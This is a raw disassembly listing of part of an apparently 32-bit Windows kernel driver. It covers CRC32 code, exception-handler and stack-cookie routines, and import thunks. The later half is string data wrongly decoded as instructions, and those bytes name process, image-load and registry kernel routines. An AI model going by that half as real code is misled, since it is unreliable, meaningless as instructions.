   1d982:	dec    DWORD PTR [ebp-0x4]
   1d985:	jne    0x1d7d6
   1d98b:	cmp    DWORD PTR [ebp+0x8],edi
   1d98e:	jb     0x1d9d8
   1d990:	mov    edx,DWORD PTR [ebp+0x8]
   1d993:	shr    edx,0x2
   1d996:	mov    DWORD PTR [ebp-0x4],edx
   1d999:	xor    eax,DWORD PTR [esi]
   1d99b:	sub    DWORD PTR [ebp+0x8],edi
   1d99e:	mov    edx,eax
   1d9a0:	shr    edx,0x10
   1d9a3:	and    edx,ecx
   1d9a5:	mov    edx,DWORD PTR [edx*4+0x7c4d0]
   1d9ac:	mov    ebx,eax
   1d9ae:	shr    ebx,0x8
   1d9b1:	and    ebx,ecx
   1d9b3:	xor    edx,DWORD PTR [ebx*4+0x7c8d0]
   1d9ba:	mov    ebx,eax
   1d9bc:	shr    ebx,0x18
   1d9bf:	xor    edx,DWORD PTR [ebx*4+0x7c0d0]
   1d9c6:	and    eax,ecx
   1d9c8:	xor    edx,DWORD PTR [eax*4+0x7ccd0]
   1d9cf:	add    esi,edi
   1d9d1:	dec    DWORD PTR [ebp-0x4]
   1d9d4:	mov    eax,edx
   1d9d6:	jne    0x1d999
   1d9d8:	cmp    DWORD PTR [ebp+0x8],0x0
   1d9dc:	pop    edi
   1d9dd:	pop    ebx
   1d9de:	je     0x1d9f7
   1d9e0:	movzx  edx,BYTE PTR [esi]
   1d9e3:	xor    edx,eax
   1d9e5:	and    edx,ecx
   1d9e7:	shr    eax,0x8
   1d9ea:	xor    eax,DWORD PTR [edx*4+0x7c0d0]
   1d9f1:	inc    esi
   1d9f2:	dec    DWORD PTR [ebp+0x8]
   1d9f5:	jne    0x1d9e0
   1d9f7:	not    eax
   1d9f9:	pop    esi
   1d9fa:	leave  
   1d9fb:	ret    0x4
   1d9fe:	int3   
   1d9ff:	int3   
   1da00:	int3   
   1da01:	int3   
   1da02:	int3   
   1da03:	int3   
   1da04:	mov    edi,edi
   1da06:	push   ebp
   1da07:	mov    ebp,esp
   1da09:	mov    edx,DWORD PTR [ebp+0xc]
   1da0c:	test   edx,edx
   1da0e:	jne    0x1da14
   1da10:	xor    eax,eax
   1da12:	jmp    0x1da1f
   1da14:	push   DWORD PTR [ebp+0x10]
   1da17:	mov    eax,DWORD PTR [ebp+0x8]
   1da1a:	call   0x1d78c
   1da1f:	pop    ebp
   1da20:	ret    0xc
   1da23:	int3   
   1da24:	int3   
   1da25:	int3   
   1da26:	int3   
   1da27:	int3   
   1da28:	mov    edi,edi
   1da2a:	push   ebp
   1da2b:	mov    ebp,esp
   1da2d:	push   0x20
   1da2f:	push   0x61737973
   1da34:	push   DWORD PTR [ebp+0x8]
   1da37:	push   0x1
   1da39:	call   DWORD PTR ds:0x1f018
   1da3f:	test   eax,eax
   1da41:	jne    0x1da4e
   1da43:	push   0xc000009a
   1da48:	call   DWORD PTR ds:0x1f014
   1da4e:	pop    ebp
   1da4f:	ret    
   1da50:	int3   
   1da51:	int3   
   1da52:	int3   
   1da53:	int3   
   1da54:	int3   
   1da55:	cmp    ecx,DWORD PTR ds:0x7e528
   1da5b:	jne    0x1da60
   1da5d:	ret    0x0
   1da60:	jmp    0x1da6a
   1da65:	int3   
   1da66:	int3   
   1da67:	int3   
   1da68:	int3   
   1da69:	int3   
   1da6a:	mov    edi,edi
   1da6c:	push   ebp
   1da6d:	mov    ebp,esp
   1da6f:	push   ecx
   1da70:	mov    DWORD PTR [ebp-0x4],ecx
   1da73:	push   0x0
   1da75:	push   DWORD PTR ds:0x7e52c
   1da7b:	push   DWORD PTR ds:0x7e528
   1da81:	push   DWORD PTR [ebp-0x4]
   1da84:	push   0xf7
   1da89:	call   DWORD PTR ds:0x1f058
   1da8f:	int3   
   1da90:	int3   
   1da91:	int3   
   1da92:	int3   
   1da93:	int3   
   1da94:	int3   
   1da95:	int3   
   1da96:	jmp    DWORD PTR ds:0x1f008
   1da9c:	int3   
   1da9d:	int3   
   1da9e:	int3   
   1da9f:	int3   
   1daa0:	int3   
   1daa1:	int3   
   1daa2:	jmp    DWORD PTR ds:0x1f00c
   1daa8:	int3   
   1daa9:	int3   
   1daaa:	int3   
   1daab:	int3   
   1daac:	int3   
   1daad:	int3   
   1daae:	jmp    DWORD PTR ds:0x1f010
   1dab4:	int3   
   1dab5:	int3   
   1dab6:	int3   
   1dab7:	int3   
   1dab8:	int3   
   1dab9:	int3   
   1daba:	jmp    DWORD PTR ds:0x1f02c
   1dac0:	int3   
   1dac1:	int3   
   1dac2:	int3   
   1dac3:	int3   
   1dac4:	int3   
   1dac5:	int3   
   1dac6:	jmp    DWORD PTR ds:0x1f030
   1dacc:	int3   
   1dacd:	int3   
   1dace:	int3   
   1dacf:	int3   
   1dad0:	int3   
   1dad1:	int3   
   1dad2:	jmp    DWORD PTR ds:0x1f03c
   1dad8:	int3   
   1dad9:	int3   
   1dada:	int3   
   1dadb:	int3   
   1dadc:	int3   
   1dadd:	int3   
   1dade:	jmp    DWORD PTR ds:0x1f048
   1dae4:	int3   
   1dae5:	int3   
   1dae6:	int3   
   1dae7:	int3   
   1dae8:	int3   
   1dae9:	int3   
   1daea:	jmp    DWORD PTR ds:0x1f050
   1daf0:	int3   
   1daf1:	int3   
   1daf2:	int3   
   1daf3:	int3   
   1daf4:	int3   
   1daf5:	int3   
   1daf6:	int3   
   1daf7:	int3   
   1daf8:	push   0x1db60
   1dafd:	push   DWORD PTR fs:0x0
   1db04:	mov    eax,DWORD PTR [esp+0x10]
   1db08:	mov    DWORD PTR [esp+0x10],ebp
   1db0c:	lea    ebp,[esp+0x10]
   1db10:	sub    esp,eax
   1db12:	push   ebx
   1db13:	push   esi
   1db14:	push   edi
   1db15:	mov    eax,ds:0x7e528
   1db1a:	xor    DWORD PTR [ebp-0x4],eax
   1db1d:	xor    eax,ebp
   1db1f:	push   eax
   1db20:	mov    DWORD PTR [ebp-0x18],esp
   1db23:	push   DWORD PTR [ebp-0x8]
   1db26:	mov    eax,DWORD PTR [ebp-0x4]
   1db29:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1db30:	mov    DWORD PTR [ebp-0x8],eax
   1db33:	lea    eax,[ebp-0x10]
   1db36:	mov    fs:0x0,eax
   1db3c:	ret    
   1db3d:	mov    ecx,DWORD PTR [ebp-0x10]
   1db40:	mov    DWORD PTR fs:0x0,ecx
   1db47:	pop    ecx
   1db48:	pop    edi
   1db49:	pop    edi
   1db4a:	pop    esi
   1db4b:	pop    ebx
   1db4c:	mov    esp,ebp
   1db4e:	pop    ebp
   1db4f:	push   ecx
   1db50:	ret    
   1db51:	int3   
   1db52:	int3   
   1db53:	int3   
   1db54:	int3   
   1db55:	int3   
   1db56:	int3   
   1db57:	int3   
   1db58:	int3   
   1db59:	int3   
   1db5a:	int3   
   1db5b:	int3   
   1db5c:	int3   
   1db5d:	int3   
   1db5e:	int3   
   1db5f:	int3   
   1db60:	mov    edi,edi
   1db62:	push   ebp
   1db63:	mov    ebp,esp
   1db65:	sub    esp,0x14
   1db68:	push   ebx
   1db69:	mov    ebx,DWORD PTR [ebp+0xc]
   1db6c:	push   esi
   1db6d:	mov    esi,DWORD PTR [ebx+0x8]
   1db70:	xor    esi,DWORD PTR ds:0x7e528
   1db76:	push   edi
   1db77:	mov    eax,DWORD PTR [esi]
   1db79:	mov    BYTE PTR [ebp-0x1],0x0
   1db7d:	mov    DWORD PTR [ebp-0x8],0x1
   1db84:	lea    edi,[ebx+0x10]
   1db87:	cmp    eax,0xfffffffe
   1db8a:	je     0x1db99
   1db8c:	mov    ecx,DWORD PTR [esi+0x4]
   1db8f:	add    ecx,edi
   1db91:	xor    ecx,DWORD PTR [eax+edi*1]
   1db94:	call   0x1da55
   1db99:	mov    ecx,DWORD PTR [esi+0xc]
   1db9c:	mov    eax,DWORD PTR [esi+0x8]
   1db9f:	add    ecx,edi
   1dba1:	xor    ecx,DWORD PTR [eax+edi*1]
   1dba4:	call   0x1da55
   1dba9:	mov    eax,DWORD PTR [ebp+0x8]
   1dbac:	test   BYTE PTR [eax+0x4],0x66
   1dbb0:	jne    0x1dc98
   1dbb6:	mov    ecx,DWORD PTR [ebp+0x10]
   1dbb9:	lea    edx,[ebp-0x14]
   1dbbc:	mov    DWORD PTR [ebx-0x4],edx
   1dbbf:	mov    ebx,DWORD PTR [ebx+0xc]
   1dbc2:	mov    DWORD PTR [ebp-0x14],eax
   1dbc5:	mov    DWORD PTR [ebp-0x10],ecx
   1dbc8:	cmp    ebx,0xfffffffe
   1dbcb:	je     0x1dc2c
   1dbcd:	lea    ecx,[ecx+0x0]
   1dbd0:	lea    eax,[ebx+ebx*2]
   1dbd3:	mov    ecx,DWORD PTR [esi+eax*4+0x14]
   1dbd7:	lea    eax,[esi+eax*4+0x10]
   1dbdb:	mov    DWORD PTR [ebp-0xc],eax
   1dbde:	mov    eax,DWORD PTR [eax]
   1dbe0:	mov    DWORD PTR [ebp+0x8],eax
   1dbe3:	test   ecx,ecx
   1dbe5:	je     0x1dbfb
   1dbe7:	mov    edx,edi
   1dbe9:	call   0x1dda1
   1dbee:	mov    BYTE PTR [ebp-0x1],0x1
   1dbf2:	test   eax,eax
   1dbf4:	jl     0x1dc36
   1dbf6:	jg     0x1dc3f
   1dbf8:	mov    eax,DWORD PTR [ebp+0x8]
   1dbfb:	mov    ebx,eax
   1dbfd:	cmp    eax,0xfffffffe
   1dc00:	jne    0x1dbd0
   1dc02:	cmp    BYTE PTR [ebp-0x1],0x0
   1dc06:	je     0x1dc2c
   1dc08:	mov    eax,DWORD PTR [esi]
   1dc0a:	cmp    eax,0xfffffffe
   1dc0d:	je     0x1dc1c
   1dc0f:	mov    ecx,DWORD PTR [esi+0x4]
   1dc12:	add    ecx,edi
   1dc14:	xor    ecx,DWORD PTR [eax+edi*1]
   1dc17:	call   0x1da55
   1dc1c:	mov    ecx,DWORD PTR [esi+0xc]
   1dc1f:	mov    edx,DWORD PTR [esi+0x8]
   1dc22:	add    ecx,edi
   1dc24:	xor    ecx,DWORD PTR [edx+edi*1]
   1dc27:	call   0x1da55
   1dc2c:	mov    eax,DWORD PTR [ebp-0x8]
   1dc2f:	pop    edi
   1dc30:	pop    esi
   1dc31:	pop    ebx
   1dc32:	mov    esp,ebp
   1dc34:	pop    ebp
   1dc35:	ret    
   1dc36:	mov    DWORD PTR [ebp-0x8],0x0
   1dc3d:	jmp    0x1dc08
   1dc3f:	mov    ecx,DWORD PTR [ebp+0xc]
   1dc42:	call   0x1ddca
   1dc47:	mov    eax,DWORD PTR [ebp+0xc]
   1dc4a:	cmp    DWORD PTR [eax+0xc],ebx
   1dc4d:	je     0x1dc61
   1dc4f:	push   0x7e528
   1dc54:	push   edi
   1dc55:	mov    edx,ebx
   1dc57:	mov    ecx,eax
   1dc59:	call   0x1dde4
   1dc5e:	mov    eax,DWORD PTR [ebp+0xc]
   1dc61:	mov    ecx,DWORD PTR [ebp+0x8]
   1dc64:	mov    DWORD PTR [eax+0xc],ecx
   1dc67:	mov    eax,DWORD PTR [esi]
   1dc69:	cmp    eax,0xfffffffe
   1dc6c:	je     0x1dc7b
   1dc6e:	mov    ecx,DWORD PTR [esi+0x4]
   1dc71:	add    ecx,edi
   1dc73:	xor    ecx,DWORD PTR [eax+edi*1]
   1dc76:	call   0x1da55
   1dc7b:	mov    ecx,DWORD PTR [esi+0xc]
   1dc7e:	mov    edx,DWORD PTR [esi+0x8]
   1dc81:	add    ecx,edi
   1dc83:	xor    ecx,DWORD PTR [edx+edi*1]
   1dc86:	call   0x1da55
   1dc8b:	mov    eax,DWORD PTR [ebp-0xc]
   1dc8e:	mov    ecx,DWORD PTR [eax+0x8]
   1dc91:	mov    edx,edi
   1dc93:	call   0x1ddb8
   1dc98:	mov    edx,0xfffffffe
   1dc9d:	cmp    DWORD PTR [ebx+0xc],edx
   1dca0:	je     0x1dc2c
   1dca2:	push   0x7e528
   1dca7:	push   edi
   1dca8:	mov    ecx,ebx
   1dcaa:	call   0x1dde4
   1dcaf:	jmp    0x1dc08
   1dcb4:	int3   
   1dcb5:	int3   
   1dcb6:	int3   
   1dcb7:	int3   
   1dcb8:	int3   
   1dcb9:	int3   
   1dcba:	int3   
   1dcbb:	int3   
   1dcbc:	push   ebx
   1dcbd:	push   esi
   1dcbe:	push   edi
   1dcbf:	mov    edx,DWORD PTR [esp+0x10]
   1dcc3:	mov    eax,DWORD PTR [esp+0x14]
   1dcc7:	mov    ecx,DWORD PTR [esp+0x18]
   1dccb:	push   ebp
   1dccc:	push   edx
   1dccd:	push   eax
   1dcce:	push   ecx
   1dccf:	push   ecx
   1dcd0:	push   0x1dd3f
   1dcd5:	push   DWORD PTR fs:0x0
   1dcdc:	mov    eax,ds:0x7e528
   1dce1:	xor    eax,esp
   1dce3:	mov    DWORD PTR [esp+0x8],eax
   1dce7:	mov    DWORD PTR fs:0x0,esp
   1dcee:	mov    eax,DWORD PTR [esp+0x30]
   1dcf2:	mov    ebx,DWORD PTR [eax+0x8]
   1dcf5:	mov    ecx,DWORD PTR [esp+0x2c]
   1dcf9:	xor    ebx,DWORD PTR [ecx]
   1dcfb:	mov    esi,DWORD PTR [eax+0xc]
   1dcfe:	cmp    esi,0xfffffffe
   1dd01:	je     0x1dd31
   1dd03:	mov    edx,DWORD PTR [esp+0x34]
   1dd07:	cmp    edx,0xfffffffe
   1dd0a:	je     0x1dd10
   1dd0c:	cmp    esi,edx
   1dd0e:	jbe    0x1dd31
   1dd10:	lea    esi,[esi+esi*2]
   1dd13:	lea    ebx,[ebx+esi*4+0x10]
   1dd17:	mov    ecx,DWORD PTR [ebx]
   1dd19:	mov    DWORD PTR [eax+0xc],ecx
   1dd1c:	cmp    DWORD PTR [ebx+0x4],0x0
   1dd20:	jne    0x1dcee
   1dd22:	mov    ecx,0x1
   1dd27:	mov    eax,DWORD PTR [ebx+0x8]
   1dd2a:	call   0x1de5c
   1dd2f:	jmp    0x1dcee
   1dd31:	pop    DWORD PTR fs:0x0
   1dd38:	add    esp,0x18
   1dd3b:	pop    edi
   1dd3c:	pop    esi
   1dd3d:	pop    ebx
   1dd3e:	ret    
   1dd3f:	mov    ecx,DWORD PTR [esp+0x4]
   1dd43:	test   DWORD PTR [ecx+0x4],0x6
   1dd4a:	mov    eax,0x1
   1dd4f:	je     0x1dd84
   1dd51:	mov    eax,DWORD PTR [esp+0x8]
   1dd55:	mov    ecx,DWORD PTR [eax+0x8]
   1dd58:	xor    ecx,eax
   1dd5a:	call   0x1da55
   1dd5f:	push   ebp
   1dd60:	mov    ebp,DWORD PTR [eax+0x18]
   1dd63:	push   DWORD PTR [eax+0xc]
   1dd66:	push   DWORD PTR [eax+0x10]
   1dd69:	push   DWORD PTR [eax+0x14]
   1dd6c:	call   0x1dcbc
   1dd71:	add    esp,0xc
   1dd74:	pop    ebp
   1dd75:	mov    eax,DWORD PTR [esp+0x8]
   1dd79:	mov    edx,DWORD PTR [esp+0x10]
   1dd7d:	mov    DWORD PTR [edx],eax
   1dd7f:	mov    eax,0x3
   1dd84:	ret    
   1dd85:	push   ebp
   1dd86:	mov    ecx,DWORD PTR [esp+0x8]
   1dd8a:	mov    ebp,DWORD PTR [ecx]
   1dd8c:	push   DWORD PTR [ecx+0x1c]
   1dd8f:	push   DWORD PTR [ecx+0x18]
   1dd92:	push   DWORD PTR [ecx+0x28]
   1dd95:	call   0x1dcbc
   1dd9a:	add    esp,0xc
   1dd9d:	pop    ebp
   1dd9e:	ret    0x4
   1dda1:	push   ebp
   1dda2:	push   esi
   1dda3:	push   edi
   1dda4:	push   ebx
   1dda5:	mov    ebp,edx
   1dda7:	xor    eax,eax
   1dda9:	xor    ebx,ebx
   1ddab:	xor    edx,edx
   1ddad:	xor    esi,esi
   1ddaf:	xor    edi,edi
   1ddb1:	call   ecx
   1ddb3:	pop    ebx
   1ddb4:	pop    edi
   1ddb5:	pop    esi
   1ddb6:	pop    ebp
   1ddb7:	ret    
   1ddb8:	mov    ebp,edx
   1ddba:	mov    esi,ecx
   1ddbc:	mov    eax,ecx
   1ddbe:	xor    eax,eax
   1ddc0:	xor    ebx,ebx
   1ddc2:	xor    ecx,ecx
   1ddc4:	xor    edx,edx
   1ddc6:	xor    edi,edi
   1ddc8:	jmp    esi
   1ddca:	push   ebp
   1ddcb:	mov    ebp,esp
   1ddcd:	push   ebx
   1ddce:	push   esi
   1ddcf:	push   edi
   1ddd0:	push   0x0
   1ddd2:	push   0x0
   1ddd4:	push   0x1dddf
   1ddd9:	push   ecx
   1ddda:	call   0x1de64
   1dddf:	pop    edi
   1dde0:	pop    esi
   1dde1:	pop    ebx
   1dde2:	pop    ebp
   1dde3:	ret    
   1dde4:	push   ebp
   1dde5:	mov    ebp,DWORD PTR [esp+0x8]
   1dde9:	push   edx
   1ddea:	push   ecx
   1ddeb:	push   DWORD PTR [esp+0x14]
   1ddef:	call   0x1dcbc
   1ddf4:	add    esp,0xc
   1ddf7:	pop    ebp
   1ddf8:	ret    0x8
   1ddfb:	int3   
   1ddfc:	int3   
   1ddfd:	int3   
   1ddfe:	int3   
   1ddff:	int3   
   1de00:	push   0x1db60
   1de05:	push   DWORD PTR fs:0x0
   1de0c:	mov    eax,DWORD PTR [esp+0x10]
   1de10:	mov    DWORD PTR [esp+0x10],ebp
   1de14:	lea    ebp,[esp+0x10]
   1de18:	sub    esp,eax
   1de1a:	push   ebx
   1de1b:	push   esi
   1de1c:	push   edi
   1de1d:	mov    eax,ds:0x7e528
   1de22:	xor    DWORD PTR [ebp-0x4],eax
   1de25:	xor    eax,ebp
   1de27:	mov    DWORD PTR [ebp-0x1c],eax
   1de2a:	push   eax
   1de2b:	mov    DWORD PTR [ebp-0x18],esp
   1de2e:	push   DWORD PTR [ebp-0x8]
   1de31:	mov    eax,DWORD PTR [ebp-0x4]
   1de34:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1de3b:	mov    DWORD PTR [ebp-0x8],eax
   1de3e:	lea    eax,[ebp-0x10]
   1de41:	mov    fs:0x0,eax
   1de47:	ret    
   1de48:	mov    ecx,DWORD PTR [ebp-0x1c]
   1de4b:	xor    ecx,ebp
   1de4d:	call   0x1da55
   1de52:	jmp    0x1db3d
   1de57:	int3   
   1de58:	int3   
   1de59:	int3   
   1de5a:	int3   
   1de5b:	int3   
   1de5c:	call   eax
   1de5e:	ret    
   1de5f:	int3   
   1de60:	int3   
   1de61:	int3   
   1de62:	int3   
   1de63:	int3   
   1de64:	jmp    DWORD PTR ds:0x1f064
   1de6a:	pop    esp
   1de6b:	add    BYTE PTR [eax],al
   1de6d:	add    BYTE PTR [eax],al
   1de6f:	add    BYTE PTR [ebx+0x0],ch
   1de72:	bound  eax,QWORD PTR [eax]
   1de74:	add    BYTE PTR fs:[ecx+0x0],dh
   1de78:	add    BYTE PTR [eax],al
   1de7a:	add    BYTE PTR fs:[ebx],dh
   1de7d:	add    BYTE PTR [eax+eax*1+0x73],ah
   1de81:	add    BYTE PTR [eax],al
   1de83:	add    BYTE PTR [esi+0x0],ch
   1de86:	je     0x1de88
   1de88:	outs   dx,BYTE PTR ds:[esi]
   1de89:	add    BYTE PTR [eax],al
   1de8b:	add    BYTE PTR [ebx+0x0],dh
   1de8e:	jns    0x1de90
   1de90:	jae    0x1de92
   1de92:	popa   
   1de93:	add    BYTE PTR [eax],al
   1de95:	add    BYTE PTR [edi+0x0],dh
   1de98:	imul   eax,DWORD PTR [eax],0x65006e
   1de9e:	add    BYTE PTR [eax],al
   1dea0:	jo     0x1dea2
   1dea2:	arpl   WORD PTR [eax],ax
   1dea4:	imul   eax,DWORD PTR [eax],0x6d0000
   1deaa:	jae    0x1deac
   1deac:	jb     0x1deae
   1deae:	add    BYTE PTR [eax],al
   1deb0:	je     0x1deb2
   1deb2:	ins    DWORD PTR es:[edi],dx
   1deb3:	add    BYTE PTR [eax+0x0],dh
   1deb6:	add    BYTE PTR [eax],al
   1deb8:	jne    0x1deba
   1deba:	jae    0x1debc
   1debc:	bound  eax,QWORD PTR [eax]
   1debe:	add    BYTE PTR [eax],al
   1dec0:	outs   dx,DWORD PTR ds:[esi]
   1dec1:	add    BYTE PTR [eax+eax*1+0x65],ch
   1dec5:	add    BYTE PTR [eax],al
   1dec7:	add    BYTE PTR [ecx+0x0],ah
   1deca:	imul   eax,DWORD PTR [eax],0x70
   1ded0:	push   0x0
   1ded2:	popa   
   1ded3:	add    BYTE PTR [ecx+0x0],bh
   1ded6:	add    BYTE PTR [eax],al
   1ded8:	jbe    0x1deda
   1deda:	add    BYTE PTR gs:[edx+0x0],dh
   1dede:	add    BYTE PTR [eax],al
   1dee0:	jae    0x1dee2
   1dee2:	popa   
   1dee3:	add    BYTE PTR [ecx+0x0],ch
   1dee6:	add    BYTE PTR [eax],al
   1dee8:	ins    BYTE PTR es:[edi],dx
   1dee9:	add    BYTE PTR [ecx+0x0],ah
   1deec:	arpl   WORD PTR [eax],ax
   1deee:	add    BYTE PTR [eax],al
   1def0:	push   0x0
   1def2:	jo     0x1def4
   1def4:	add    BYTE PTR [bx+si],al
   1def7:	add    BYTE PTR [eax+0x0],ch
   1defa:	imul   eax,DWORD PTR [eax],0x64
   1df00:	jo     0x1df02
   1df02:	outs   dx,BYTE PTR ds:[esi]
   1df03:	add    BYTE PTR [edi+0x0],ah
   1df06:	add    BYTE PTR [eax],al
   1df08:	outs   dx,BYTE PTR ds:[esi]
   1df09:	add    BYTE PTR [eax+eax*1+0x71],dh
   1df0d:	add    BYTE PTR [eax],al
   1df0f:	add    BYTE PTR [eax],al
   1df11:	int3   
   1df12:	dec    ebx
   1df13:	add    BYTE PTR [ebp+0x0],ah
   1df16:	push   ebx
   1df17:	add    BYTE PTR [ebp+0x0],ah
   1df1a:	jb     0x1df1c
   1df1c:	jbe    0x1df1e
   1df1e:	imul   eax,DWORD PTR [eax],0x650063
   1df24:	inc    esp
   1df25:	add    BYTE PTR [ebp+0x0],ah
   1df28:	jae    0x1df2a
   1df2a:	arpl   WORD PTR [eax],ax
   1df2c:	jb     0x1df2e
   1df2e:	imul   eax,DWORD PTR [eax],0x740070
   1df34:	outs   dx,DWORD PTR ds:[esi]
   1df35:	add    BYTE PTR [edx+0x0],dh
   1df38:	push   esp
   1df39:	add    BYTE PTR [ecx+0x0],ah
   1df3c:	bound  eax,QWORD PTR [eax]
   1df3e:	ins    BYTE PTR es:[edi],dx
   1df3f:	add    BYTE PTR [ebp+0x0],ah
   1df42:	add    BYTE PTR [eax],al
   1df44:	pop    edx
   1df45:	add    BYTE PTR [edi+0x0],dh
   1df48:	dec    edi
   1df49:	add    BYTE PTR [eax+0x0],dh
   1df4c:	add    BYTE PTR gs:[esi+0x0],ch
   1df50:	push   eax
   1df51:	add    BYTE PTR [edx+0x0],dh
   1df54:	outs   dx,DWORD PTR ds:[esi]
   1df55:	add    BYTE PTR [ebx+0x0],ah
   1df58:	add    BYTE PTR gs:[ebx+0x0],dh
   1df5c:	jae    0x1df5e
   1df5e:	add    BYTE PTR [eax],al
   1df60:	push   eax
   1df61:	add    BYTE PTR [ebx+0x0],dh
   1df64:	push   ebx
   1df65:	add    BYTE PTR [ebp+0x0],ah
   1df68:	je     0x1df6a
   1df6a:	dec    esp
   1df6b:	add    BYTE PTR [edi+0x0],ch
   1df6e:	popa   
   1df6f:	add    BYTE PTR [eax+eax*1+0x49],ah
   1df73:	add    BYTE PTR [ebp+0x0],ch
   1df76:	popa   
   1df77:	add    BYTE PTR [edi+0x0],ah
   1df7a:	add    BYTE PTR gs:[esi+0x0],cl
   1df7e:	outs   dx,DWORD PTR ds:[esi]
   1df7f:	add    BYTE PTR [eax+eax*1+0x69],dh
   1df83:	add    BYTE PTR [esi+0x0],ah
   1df86:	jns    0x1df88
   1df88:	push   edx
   1df89:	add    BYTE PTR [edi+0x0],ch
   1df8c:	jne    0x1df8e
   1df8e:	je     0x1df90
   1df90:	imul   eax,DWORD PTR [eax],0x65006e
   1df96:	add    BYTE PTR [eax],al
   1df98:	pop    edx
   1df99:	add    BYTE PTR [edi+0x0],dh
   1df9c:	inc    esp
   1df9d:	add    BYTE PTR [ebp+0x0],dh
   1dfa0:	jo     0x1dfa2
   1dfa2:	ins    BYTE PTR es:[edi],dx
   1dfa3:	add    BYTE PTR [ecx+0x0],ch
   1dfa6:	arpl   WORD PTR [eax],ax
   1dfa8:	popa   
   1dfa9:	add    BYTE PTR [eax+eax*1+0x65],dh
   1dfad:	add    BYTE PTR [eax+eax*1+0x6f],dl
   1dfb1:	add    BYTE PTR [ebx+0x0],ch
   1dfb4:	add    BYTE PTR gs:[esi+0x0],ch
   1dfb8:	add    BYTE PTR [eax],al
   1dfba:	push   eax
   1dfbb:	add    BYTE PTR [ebx+0x0],dh
   1dfbe:	push   ebx
   1dfbf:	add    BYTE PTR [ebp+0x0],ah
   1dfc2:	je     0x1dfc4
   1dfc4:	inc    ebx
   1dfc5:	add    BYTE PTR [edx+0x0],dh
   1dfc8:	add    BYTE PTR gs:[ecx+0x0],ah
   1dfcc:	je     0x1dfce
   1dfce:	add    BYTE PTR gs:[eax+0x0],dl
   1dfd2:	jb     0x1dfd4
   1dfd4:	outs   dx,DWORD PTR ds:[esi]
   1dfd5:	add    BYTE PTR [ebx+0x0],ah
   1dfd8:	add    BYTE PTR gs:[ebx+0x0],dh
   1dfdc:	jae    0x1dfde
   1dfde:	dec    esi
   1dfdf:	add    BYTE PTR [edi+0x0],ch
   1dfe2:	je     0x1dfe4
   1dfe4:	imul   eax,DWORD PTR [eax],0x790066
   1dfea:	push   edx
   1dfeb:	add    BYTE PTR [edi+0x0],ch
   1dfee:	jne    0x1dff0
   1dff0:	je     0x1dff2
   1dff2:	imul   eax,DWORD PTR [eax],0x65006e
   1dff8:	add    BYTE PTR [eax],al
   1dffa:	pop    edx
   1dffb:	add    BYTE PTR [edi+0x0],dh
   1dffe:	dec    edi
   1dfff:	add    BYTE PTR [eax+0x0],dh
   1e002:	add    BYTE PTR gs:[esi+0x0],ch
   1e006:	inc    esi
   1e007:	add    BYTE PTR [ecx+0x0],ch
   1e00a:	ins    BYTE PTR es:[edi],dx
   1e00b:	add    BYTE PTR [ebp+0x0],ah
   1e00e:	add    BYTE PTR [eax],al
   1e010:	pop    edx
   1e011:	add    BYTE PTR [edi+0x0],dh
   1e014:	push   ecx
   1e015:	add    BYTE PTR [ebp+0x0],dh
   1e018:	add    BYTE PTR gs:[edx+0x0],dh
   1e01c:	jns    0x1e01e
   1e01e:	dec    ecx
   1e01f:	add    BYTE PTR [esi+0x0],ch
   1e022:	data16 add BYTE PTR [edi+0x0],ch
   1e026:	jb     0x1e028
   1e028:	ins    DWORD PTR es:[edi],dx
   1e029:	add    BYTE PTR [ecx+0x0],ah
   1e02c:	je     0x1e02e
   1e02e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e034:	push   eax
   1e035:	add    BYTE PTR [edx+0x0],dh
   1e038:	outs   dx,DWORD PTR ds:[esi]
   1e039:	add    BYTE PTR [ebx+0x0],ah
   1e03c:	add    BYTE PTR gs:[ebx+0x0],dh
   1e040:	jae    0x1e042
   1e042:	add    BYTE PTR [eax],al
   1e044:	pop    edx
   1e045:	add    BYTE PTR [edi+0x0],dh
   1e048:	push   ecx
   1e049:	add    BYTE PTR [ebp+0x0],dh
   1e04c:	add    BYTE PTR gs:[edx+0x0],dh
   1e050:	jns    0x1e052
   1e052:	push   ebx
   1e053:	add    BYTE PTR [ecx+0x0],bh
   1e056:	jae    0x1e058
   1e058:	je     0x1e05a
   1e05a:	add    BYTE PTR gs:[ebp+0x0],ch
   1e05e:	dec    ecx
   1e05f:	add    BYTE PTR [esi+0x0],ch
   1e062:	data16 add BYTE PTR [edi+0x0],ch
   1e066:	jb     0x1e068
   1e068:	ins    DWORD PTR es:[edi],dx
   1e069:	add    BYTE PTR [ecx+0x0],ah
   1e06c:	je     0x1e06e
   1e06e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e074:	add    BYTE PTR [eax],al
   1e076:	pop    edx
   1e077:	add    BYTE PTR [edi+0x0],dh
   1e07a:	dec    edi
   1e07b:	add    BYTE PTR [eax+0x0],dh
   1e07e:	add    BYTE PTR gs:[esi+0x0],ch
   1e082:	dec    ebx
   1e083:	add    BYTE PTR [ebp+0x0],ah
   1e086:	jns    0x1e088
   1e088:	add    BYTE PTR [eax],al
   1e08a:	pop    edx
   1e08b:	add    BYTE PTR [edi+0x0],dh
   1e08e:	inc    esp
   1e08f:	add    BYTE PTR [ebp+0x0],ah
   1e092:	ins    BYTE PTR es:[edi],dx
   1e093:	add    BYTE PTR [ebp+0x0],ah
   1e096:	je     0x1e098
   1e098:	add    BYTE PTR gs:[ebx+0x0],cl
   1e09c:	add    BYTE PTR gs:[ecx+0x0],bh
   1e0a0:	add    BYTE PTR [eax],al
   1e0a2:	pop    edx
   1e0a3:	add    BYTE PTR [edi+0x0],dh
   1e0a6:	push   ebx
   1e0a7:	add    BYTE PTR [ebp+0x0],ah
   1e0aa:	je     0x1e0ac
   1e0ac:	push   esi
   1e0ad:	add    BYTE PTR [ecx+0x0],ah
   1e0b0:	ins    BYTE PTR es:[edi],dx
   1e0b1:	add    BYTE PTR [ebp+0x0],dh
   1e0b4:	add    BYTE PTR gs:[ebx+0x0],cl
   1e0b8:	add    BYTE PTR gs:[ecx+0x0],bh
   1e0bc:	add    BYTE PTR [eax],al
   1e0be:	pop    edx
   1e0bf:	add    BYTE PTR [edi+0x0],dh
   1e0c2:	push   ecx
   1e0c3:	add    BYTE PTR [ebp+0x0],dh
   1e0c6:	add    BYTE PTR gs:[edx+0x0],dh
   1e0ca:	jns    0x1e0cc
   1e0cc:	push   esi
   1e0cd:	add    BYTE PTR [edi+0x0],ch
